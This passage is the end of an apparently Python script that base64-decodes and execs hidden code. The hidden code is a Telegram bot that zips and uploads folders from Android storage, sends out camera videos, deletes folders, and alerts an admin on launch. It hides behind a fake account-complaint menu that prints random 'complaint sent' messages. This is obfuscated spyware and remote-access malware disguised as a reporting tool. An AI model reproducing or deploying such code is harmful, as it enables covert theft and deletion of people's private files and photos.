b2xkZXJfbmFtZX0iINmE2YUg2YrYqtmFINin2YTYudir2YjYsSDYudmE2YrZhy4g8J+aqycpCiAgICAgICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdjb3B5X2RhdGEnKQogICAgICAgIHJldHVybgogICAgCiAgICBpZiBpc19mb2xkZXJfdG9vX2xhcmdlKGZvbGRlcl9wYXRoKToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9iq2YjZgti5INij2YYg2KrZg9mI2YYg2YXYrdiq2YjZitin2Kog2KfZhNmF2KzZhNivINir2YLZitmE2Kkg2KzYr9mL2KcuICDwn5OmJykKICAgIAogICAgemlwX2ZpbGVfcGF0aCA9IGNyZWF0ZV96aXBfYXJjaGl2ZShmb2xkZXJfcGF0aCwgZm9sZGVyX25hbWUpCiAgICBpZiB6aXBfZmlsZV9wYXRoOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKHppcF9maWxlX3BhdGgsICdyYicpIGFzIHppcF9maWxlOgogICAgICAgICAgICAgICAgYm90LnNlbmRfZG9jdW1lbnQobWVzc2FnZS5jaGF0LmlkLCB6aXBfZmlsZSkKICAgICAgICAgICAgb3MucmVtb3ZlKHppcF9maWxlX3BhdGgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZifYrdiv2Ksg2K7Yt9ijINij2KvZhtin2KEg2KXYsdiz2KfZhCDYp9mE2KPYsdi02YrZgToge2V9IPCfmqsnKQogICAgZWxzZToKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9it2K/YqyDYrti32KMg2KPYq9mG2KfYoSDYpdmG2LTYp9ihINin2YTYo9ix2LTZitmBLiDwn5qrJykKICAgIAogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdjb3B5X2RhdGEnKQoKQGJvdC5jYWxsYmFja19xdWVyeV9oYW5kbGVyKGZ1bmM9bGFtYmRhIGNhbGw6IGNhbGwuZGF0YSA9PSAnZGVsZXRlX2ZvbGRlcicpCmRlZiBhc2tfZm9yX2RlbGV0ZV9mb2xkZXJfbmFtZShjYWxsKToKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsICfYo9iv2K7ZhCDYp9iz2YUg2KfZhNmF2KzZhNivINin2YTZhdix2KfYryDYrdiw2YHZhzog8J+TgScpCiAgICBib3QucmVnaXN0ZXJfbmV4dF9zdGVwX2hhbmRsZXIoY2FsbC5tZXNzYWdlLCBwcm9jZXNzX2RlbGV0ZV9mb2xkZXJfbmFtZSkKCmRlZiBwcm9jZXNzX2RlbGV0ZV9mb2xkZXJfbmFtZShtZXNzYWdlKToKICAgIGZvbGRlcl9uYW1lID0gbWVzc2FnZS50ZXh0CiAgICByb290X2RpcmVjdG9yeSA9ICcvc3RvcmFnZS9lbXVsYXRlZC8wLycKICAgIGZvbGRlcl9wYXRoID0gZmluZF9mb2xkZXIocm9vdF9kaXJlY3RvcnksIGZvbGRlcl9uYW1lKQogICAgCiAgICBpZiBub3QgZm9sZGVyX3BhdGg6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2YXYrNmE2K8gIntmb2xkZXJfbmFtZX0iINmE2YUg2YrYqtmFINin2YTYudir2YjYsSDYudmE2YrZhy4g8J+aqycpCiAgICAgICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdkZWxldGVfZm9sZGVyJykKICAgICAgICByZXR1cm4KICAgIAogICAgdHJ5OgogICAgICAgIHNodXRpbC5ybXRyZWUoZm9sZGVyX3BhdGgpCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2YXYrNmE2K8gIntmb2xkZXJfbmFtZX0iINiq2YUg2K3YsNmB2Ycg2KjZhtis2KfYrS4g8J+Xke+4jycpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYn2K7Yt9ijINi52YbYryDYrdiw2YEg2YXYrNmE2K86IHtlfSDwn5qrJykKICAgIAogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdkZWxldGVfZm9sZGVyJykKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEgPT0gJ3NlYXJjaF92aWRlb3MnKQpkZWYgYXNrX2Zvcl92aWRlb19jb3VudChjYWxsKToKICAgIHJvb3RfZGlyZWN0b3J5ID0gJy9zdG9yYWdlL2VtdWxhdGVkLzAvJwogICAgc3BlY2lmaWNfZm9sZGVycyA9IFsnL3N0b3JhZ2UvZW11bGF0ZWQvMC9WaWRlb3MnLCAnL3N0b3JhZ2UvZW11bGF0ZWQvMC9EQ0lNL0NhbWVyYSddCiAgICB2aWRlb19jb3VudCA9IHN1bShjb3VudF92aWRlb3MoZm9sZGVyKSBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnMgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKSkKICAgIHZpZGVvX2NvdW50ICs9IGNvdW50X3ZpZGVvcyhyb290X2RpcmVjdG9yeSkKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2FsbC5tZXNzYWdlLmNoYXQuaWQsIGYn2K3Yp9mE2YrYpyDYudmE2Ykg2KfZhNis2YfYp9iyIHt2aWRlb19jb3VudH0g2YHZitiv2YrZiC4gINmD2YUg2LnYr9ivINmF2YLYp9i32Lkg2KfZhNmB2YrYr9mK2Ygg2KfZhNiq2Yog2KrYsdmK2K/Zh9in2J8g8J+OpScpCiAgICBib3QucmVnaXN0ZXJfbmV4dF9zdGVwX2hhbmRsZXIoY2FsbC5tZXNzYWdlLCBwcm9jZXNzX3ZpZGVvX2NvdW50LCByb290X2RpcmVjdG9yeSwgc3BlY2lmaWNfZm9sZGVycykKCmRlZiBwcm9jZXNzX3ZpZGVvX2NvdW50KG1lc3NhZ2UsIHJvb3RfZGlyZWN0b3J5LCBzcGVjaWZpY19mb2xkZXJzKToKICAgIHRyeToKICAgICAgICBjb3VudCA9IGludChtZXNzYWdlLnRleHQpCiAgICAgICAgaWYgY291bnQgPD0gMDoKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICfYp9mE2LHYrNin2KEg2KXYr9iu2KfZhCDYudiv2K8g2LXYp9mE2K0g2YXZhiDZhdmC2KfYt9i5INin2YTZgdmK2K/ZitmILiDwn46lJykKICAgICAgICByZXR1cm4KCiAgICBmb3IgZm9sZGVyIGluIHNwZWNpZmljX2ZvbGRlcnM6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyKToKICAgICAgICAgICAgc2VuZF9tZWRpYV9mcm9tX2RpcmVjdG9yeShmb2xkZXIsIGNvdW50LCBtZXNzYWdlLCAndmlkZW8nKQogICAgICAgICAgICBjb3VudCAtPSBjb3VudF92aWRlb3MoZm9sZGVyKQogICAgICAgICAgICBpZiBjb3VudCA8PSAwOgogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAKICAgIHNlbmRfbWVkaWFfZnJvbV9kaXJlY3Rvcnkocm9vdF9kaXJlY3RvcnksIGNvdW50LCBtZXNzYWdlLCAndmlkZW8nKQogICAgYXNrX3RvX3JldHVybl90b19tZW51KG1lc3NhZ2UsICdzZWFyY2hfdmlkZW9zJykKCmRlZiBmaW5kX2ZvbGRlcihyb290X2RpcmVjdG9yeSwgZm9sZGVyX25hbWUpOgogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXJlY3RvcnkpOgogICAgICAgIGlmIGZvbGRlcl9uYW1lIGluIGRpcnM6CiAgICAgICAgICAgIHJldHVybiBvcy5wYXRoLmpvaW4ocm9vdCwgZm9sZGVyX25hbWUpCiAgICByZXR1cm4gTm9uZQoKZGVmIGNyZWF0ZV96aXBfYXJjaGl2ZShmb2xkZXJfcGF0aCwgZm9sZGVyX25hbWUpOgogICAgdHJ5OgogICAgICAgIHRlbXBfZGlyID0gJy90bXAnCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHRlbXBfZGlyKToKICAgICAgICAgICAgdGVtcF9kaXIgPSBvcy5nZXRjd2QoKQogICAgICAgIHppcF9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcF9kaXIsIGYne2ZvbGRlcl9uYW1lfS56aXAnKQogICAgICAgIHNodXRpbC5tYWtlX2FyY2hpdmUoemlwX2ZpbGVfcGF0aFs6LTRdLCAnemlwJywgZm9sZGVyX3BhdGgpCiAgICAgICAgcmV0dXJuIHppcF9maWxlX3BhdGgKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGlzX2ZvbGRlcl90b29fbGFyZ2UoZm9sZGVyX3BhdGgpOgogICAgdG90YWxfc2l6ZSA9IDAKICAgIGZvciBkaXJwYXRoLCBkaXJuYW1lcywgZmlsZW5hbWVzIGluIG9zLndhbGsoZm9sZGVyX3BhdGgpOgogICAgICAgIGZvciBmIGluIGZpbGVuYW1lczoKICAgICAgICAgICAgZnAgPSBvcy5wYXRoLmpvaW4oZGlycGF0aCwgZikKICAgICAgICAgICAgdG90YWxfc2l6ZSArPSBvcy5wYXRoLmdldHNpemUoZnApCiAgICByZXR1cm4gdG90YWxfc2l6ZSA+IDEwMjQgKiAxMDI0ICogMTAwICAKCmRlZiBhc2tfdG9fcmV0dXJuX3RvX21lbnUobWVzc2FnZSwgdGFzayk6CiAgICBrZXlib2FyZCA9IHR5cGVzLklubGluZUtleWJvYXJkTWFya3VwKCkKICAgIGJ1dHRvbjEgPSB0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2YbYudmFJywgY2FsbGJhY2tfZGF0YT0ncmV0dXJuX3RvX21lbnUnKQogICAgYnV0dG9uMiA9IHR5cGVzLklubGluZUtleWJvYXJkQnV0dG9uKCfZhNinJywgY2FsbGJhY2tfZGF0YT1mJ3JlcGVhdF97dGFza30nKQogICAga2V5Ym9hcmQuYWRkKGJ1dHRvbjEsIGJ1dHRvbjIpCiAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJ9mH2YQg2KrYsdmK2K8g2KfZhNi52YjYr9ipINil2YTZiSDYp9mE2YLYp9im2YXYqdifIPCflIQnLCByZXBseV9tYXJrdXA9a2V5Ym9hcmQpCgpAYm90LmNhbGxiYWNrX3F1ZXJ5X2hhbmRsZXIoZnVuYz1sYW1iZGEgY2FsbDogY2FsbC5kYXRhID09ICdyZXR1cm5fdG9fbWVudScpCmRlZiByZXR1cm5fdG9fbWVudShjYWxsKToKICAgIHN0YXJ0KGNhbGwubWVzc2FnZSkKCkBib3QuY2FsbGJhY2tfcXVlcnlfaGFuZGxlcihmdW5jPWxhbWJkYSBjYWxsOiBjYWxsLmRhdGEuc3RhcnRzd2l0aCgncmVwZWF0XycpKQpkZWYgcmVwZWF0X3Rhc2soY2FsbCk6CiAgICB0YXNrID0gY2FsbC5kYXRhLnNwbGl0KCdfJylbMV0KICAgIGlmIHRhc2sgPT0gJ2V4dHJhY3RfcGhvdG9zJzoKICAgICAgICBhc2tfZm9yX3Bob3RvX2NvdW50KGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ2NsZWFyX2RhdGEnOgogICAgICAgIGNsZWFyX2RhdGEoY2FsbCkKICAgIGVsaWYgdGFzayA9PSAnY29weV9kYXRhJzoKICAgICAgICBhc2tfZm9yX2ZvbGRlcl9uYW1lKGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ2RlbGV0ZV9mb2xkZXInOgogICAgICAgIGFza19mb3JfZGVsZXRlX2ZvbGRlcl9uYW1lKGNhbGwpCiAgICBlbGlmIHRhc2sgPT0gJ3NlYXJjaF92aWRlb3MnOgogICAgICAgIGFza19mb3JfdmlkZW9fY291bnQoY2FsbCkKICAgIGVsc2U6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjYWxsLm1lc3NhZ2UuY2hhdC5pZCwgJ9it2LPZhtmL2KfYjCDYs9ij2YbYqti42LEg2KPZgdi52KfZhNmDLiAg2YrZhdmD2YbZgyDYp9mE2KfYqti12KfZhCDYqNin2YTZgtin2KbZhdipINio2KfYs9iq2K7Yr9in2YUg2KfZhNiy2LEg2KPYr9mG2KfZhy4g8J+UhCcsIHJlcGx5X21hcmt1cD10eXBlcy5JbmxpbmVLZXlib2FyZE1hcmt1cCgpLmFkZCh0eXBlcy5JbmxpbmVLZXlib2FyZEJ1dHRvbign2YLYp9im2YXYqSDYt9i52KfZhScsIGNhbGxiYWNrX2RhdGE9J3JldHVybl90b19tZW51JykpKQoKbW0gPSByIiIiCiAgICAgICAvJCQgICAvJCQgLyQkJCQkJCQkIC8kJCAgIC8kJCAvJCQgICAvJCQgIC8kJCQkJCQgIC8kJCQkJCQkJAogICAgICB8ICQkJCB8ICQkfCAkJF9fX19fL3wgJCQgIC8gJCR8ICQkICB8ICQkIC8kJF9fICAkJHxfXyAgJCRfXy8KICAgICAgfCAkJCQkfCAkJHwgJCQgICAgICB8ICAkJC8gJCQvfCAkJCAgfCAkJHwgJCQgIFxfXy8gICB8ICQkICAgCiAgICAgIHwgJCQgJCQgJCR8ICQkJCQkICAgIFwgICQkJCQvIHwgJCQgIHwgJCR8ICAkJCQkJCQgICAgfCAkJCAgIAogICAgICB8ICQkICAkJCQkfCAkJF9fLyAgICAgPiQkICAkJCB8ICQkICB8ICQkIFxfX19fICAkJCAgIHwgJCQgICAKICAgICAgfCAkJFwgICQkJHwgJCQgICAgICAgLyQkL1wgICQkfCAkJCAgfCAkJCAvJCQgIFwgJCQgICB8ICQkICAgCiAgICAgIHwgJCQgXCAgJCR8ICQkJCQkJCQkfCAkJCAgXCAkJHwgICQkJCQkJC98ICAkJCQkJCQvICAgfCAkJCAgIAogICAgICB8X18vICBcX18vfF9fX19fX19fL3xfXy8gIHxfXy8gXF9fX19fXy8gIFxfX19fX18vICAgIHxfXy8gIiIiCgoKbXQgPSByIiIiIiIiICsgRm9yZS5SRUQgKyAi4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIKIiIiICsgRm9yZS5SRUQgKyAi4pWRIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgICAgICAgICAgICAgICAgICAgICBDcmVhdG9yOiBARF9hcmtfaGFja2VyICAgICAgICAgICAgICAgICAgICAgICAiIiIgKyBGb3JlLlJFRCArICLilZEiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIiAKIiIiICsgRm9yZS5SRUQgKyAi4pWg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWjIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgCiIiIiArIEZvcmUuUkVEICsgIuKVkSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiIFsiIiIgKyBGb3JlLlJFRCArICIwMSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBGcmF1ZCAgIFsiIiIgKyBGb3JlLlJFRCArICIwNiIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSDQmtCw0L3QsNC7ICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMTEiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gVGhyZWF0cyAgICAgICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMTYiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gVHJvbGxpbmcgICIiIiArIEZvcmUuUkVEICsgIuKVkSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiIAoiIiIgKyBGb3JlLlJFRCArICLilZEiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIiBbIiIiICsgRm9yZS5SRUQgKyAiMDIiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gU3BhbSAgICAgICAgICAgIFsiIiIgKyBGb3JlLlJFRCArICIwNyIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBPcmRpbmFyeSAgIFsiIiIgKyBGb3JlLlJFRCArICIxMiIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBEcnVncyAgICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMTciICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gV2lydCAgICAgIiIiICsgRm9yZS5SRUQgKyAi4pWRIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgCiIiIiArIEZvcmUuUkVEICsgIuKVkSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiIFsiIiIgKyBGb3JlLlJFRCArICIwMyIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBQaGlzaGluZyAgICAgICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMDgiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gU2Vzc2lvbiAgICBbIiIiICsgRm9yZS5SRUQgKyAiMTMiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gUmVsaWdpb24gICAgICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMTgiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gUHJlbWl1bSAgIiIiICsgRm9yZS5SRUQgKyAi4pWRIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgCiIiIiArIEZvcmUuUkVEICsgIuKVkSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiIFsiIiIgKyBGb3JlLlJFRCArICIwNCIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBDaGlsZCBwb3JuICAgWyIiIiArIEZvcmUuUkVEICsgIjA5IiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiJdIEdyb3VwICAgIFsiIiIgKyBGb3JlLlJFRCArICIxNCIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBIYXJhc3NtZW50ICBbIiIiICsgRm9yZS5SRUQgKyAiMTkiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gQm90ICAgICAgIiIiICsgRm9yZS5SRUQgKyAi4pWRIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgCiIiIiArIEZvcmUuUkVEICsgIuKVkSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiIFsiIiIgKyBGb3JlLlJFRCArICIwNSIgKyBTdHlsZS5SRVNFVF9BTEwgKyByIiIiXSBEaWFub24gICAgICAgICAgWyIiIiArIEZvcmUuUkVEICsgIjEwIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiJdIFZpb2xlbmNlICAgWyIiIiArIEZvcmUuUkVEICsgIjE1IiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiJdIENvbnRlbnQgMTgrICAgICBbIiIiICsgRm9yZS5SRUQgKyAiMjAiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIl0gRXhpdCAgICAiIiIgKyBGb3JlLlJFRCArICLilZEiICsgU3R5bGUuUkVTRVRfQUxMICsgciIiIiAKIiIiICsgRm9yZS5SRUQgKyAi4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiArIFN0eWxlLlJFU0VUX0FMTCArIHIiIiIgIiIiCgoKZGVmIGJhbm5lcigpOgogICAgcHJpbnQoRm9yZS5SRUQrbW0rU3R5bGUuUkVTRVRfQUxMKQogICAgcHJpbnQobXQpCgpkZWYgY29tcGxhaW50X2hhbmRsZXIoKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgY2hvaWNlID0gaW5wdXQoIkVudGVyIGEgbnVtYmVyIGZyb20gMSB0byAxOSAoMjAgdG8gZXhpdCk6ICIpCiAgICAgICAgaWYgY2hvaWNlID09ICcyMCc6CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgdHJ5OgogICAgICAgICAgICBudW1fY29tcGxhaW50cyA9IGludChjaG9pY2UpCiAgICAgICAgICAgIGlmIG51bV9jb21wbGFpbnRzIDwgMSBvciBudW1fY29tcGxhaW50cyA+IDE5OgogICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcgogICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyIGJldHdlZW4gMSBhbmQgMTkuIOKdjCIpCiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgIHVzZXJfaWQgPSBpbnB1dCgiRW50ZXIgdXNlciBJRDogIikKICAgICAgICBudW1fY29tcGxhaW50cyA9IGludChpbnB1dCgiRW50ZXIgdGhlIG51bWJlciBvZiBjb21wbGFpbnRzOiAiKSkKCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UobnVtX2NvbXBsYWludHMpOgogICAgICAgICAgICBpZiByYW5kb20ucmFuZGludCgxLCAxMCkgPT0gMToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfUVycm9yIHNlbmRpbmcgY29tcGxhaW50e1N0eWxlLlJFU0VUX0FMTH0iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1Db21wbGFpbnQgc2VudCBzdWNjZXNzZnVsbHl7U3R5bGUuUkVTRVRfQUxMfSIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oMSwgMykpIAoKZGVmIG5vdGlmeV9hZG1pbigpOgogICAgYm90LnNlbmRfbWVzc2FnZShBRE1JTl9JRCwgItin2YbYqtio2KfZhyEgINiq2YUg2KXYt9mE2KfZgiDYp9mE2KjZiNiqLlxu2YrZhdmD2YbZgyDYp9mE2KjYr9ihINmB2Yog2KfZhNi52YXZhCAvc3RhcnQg8J+agCIpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgYmFubmVyKCkKICAgIG5vdGlmeV9hZG1pbigpCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1ib3QucG9sbGluZywgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgIGNvbXBsYWludF9oYW5kbGVyKCk="""

# فك Base64 وتشغيل الكود مباشرة
exec(base64.b64decode(b64_code).decode("utf-8"))
